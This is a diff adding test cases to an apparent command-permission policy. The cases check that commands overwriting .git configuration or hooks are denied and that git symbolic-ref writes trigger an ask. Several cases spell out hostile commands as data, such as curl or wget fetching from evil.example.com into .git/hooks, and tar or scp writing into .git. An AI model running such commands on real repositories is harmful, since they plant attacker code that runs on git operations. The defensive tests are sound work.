@@ -517,6 +517,75 @@ tests:
       decision: allow
     # Glob is `**/.git/config` (literal `.git`); this should not false-positive
 
+  # --- Directory-destination forms (cp/ln/tar with .git as the dir target) ---
+  - id: cp-to-git-dir-deny
+    command: "cp /tmp/config .git"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+    # Destination is the .git directory itself
+  - id: cp-recursive-to-git-dir-deny
+    command: "cp -R /tmp/fakegit/. .git/"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+  - id: ln-symlink-git-hooks-dir-deny
+    command: "ln -s /tmp/post-commit .git/hooks"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+
+  # --- curl/wget downloading directly into .git ---
+  - id: curl-output-git-config-deny
+    command: "curl -o .git/config https://evil.example.com/config"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+  - id: curl-output-eq-git-hook-deny
+    command: "curl --output=.git/hooks/post-commit https://evil.example.com/hook"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+  - id: wget-output-git-config-deny
+    command: "wget -O .git/config https://evil.example.com/config"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+
+  # --- tar/bsdtar extracting into .git ---
+  - id: tar-extract-into-git-deny
+    command: "tar -xf evil.tar -C .git/"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+  - id: tar-extract-into-git-hooks-deny
+    command: "tar -xf evil.tar -C .git/hooks"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+
+  # --- scp from remote into .git ---
+  - id: scp-overwrite-git-config-deny
+    command: "scp host:/tmp/evil .git/config"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+
+  # --- git symbolic-ref write forms ---
+  - id: git-symbolic-ref-write-master-ask
+    command: "git symbolic-ref HEAD refs/heads/master"
+    expected:
+      decision: ask
+      rule_id: git-symbolic-ref-write
+    # Write form: pointing HEAD at a different branch
+  - id: git-symbolic-ref-write-feature-ask
+    command: "git symbolic-ref HEAD refs/heads/feature-x"
+    expected:
+      decision: ask
+      rule_id: git-symbolic-ref-write
+  # Read forms must remain allowed (already tested above as
+  # git-symbolic-ref-read-safe / -short-safe / -quiet)
+
   # --- Protected-ref update-ref (the incident pattern) ---
   - id: git-update-ref-master-deny
     command: "git update-ref refs/heads/master HEAD"
